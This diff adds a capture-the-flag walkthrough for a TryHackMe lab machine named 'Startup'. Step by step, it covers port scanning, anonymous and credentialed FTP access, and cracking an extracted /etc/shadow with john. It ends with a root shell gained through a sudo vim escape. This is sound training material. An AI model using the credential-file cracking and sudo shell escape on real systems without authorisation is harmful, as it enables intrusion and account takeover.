@@ -1,0 +1,94 @@
+----------------                               ------------------
+               :::::::::::;| STARTUP |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "STARTUP".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 3 ports (21/FTP, 22/SSH, 80/HTTP)
+
+3. What's on port 80?
+ANS: Startup company page with /files/ directory!
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (FTP ACCESS)
+
+1. CHECK ANONYMOUS FTP.
+
+    ftp <ip>
+    Username: anonymous
+    Password: (press enter)
+    "FOUND interesting.txt and startup.txt"
+
+2. READ FILES.
+
+    get interesting.txt
+    "Says: 'There's a hidden message in the website!'"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (WEB EXPLOIT)
+
+1. FIND HIDDEN MESSAGE.
+
+    view-source:http://<ip>
+    "Comment: 'message to employees: ftp creds - ftpuser:givemefiles777'"
+
+2. LOGIN TO FTP.
+
+    ftp <ip>
+    Username: ftpuser
+    Password: givemefiles777
+    "FOUND backup.zip - DOWNLOAD IT!"
+
+----------TASK 3 COMPLETED-----------
+
+TASK-4 (CRACK ZIP)
+
+1. EXTRACT FILES.
+
+    unzip backup.zip
+    "Got /etc/passwd and /etc/shadow!"
+
+2. CRACK HASHES.
+
+    unshadow passwd shadow > hashes.txt
+    john --wordlist=rockyou.txt hashes.txt
+    "FOUND: lennie:iloveyou123"
+
+----------TASK 4 COMPLETED-----------
+
+TASK-5 (PRIV ESC)
+
+1. SSH ACCESS.
+
+    ssh lennie@<ip>
+    Password: iloveyou123
+    "WE'RE IN!"
+
+2. CHECK SUDO.
+
+    sudo -l
+    "Can run /usr/bin/vim as root!"
+    sudo vim -c ':!/bin/sh'
+    "ROOT SHELL GET!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/lennie/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- STARTUP PWNED ----------
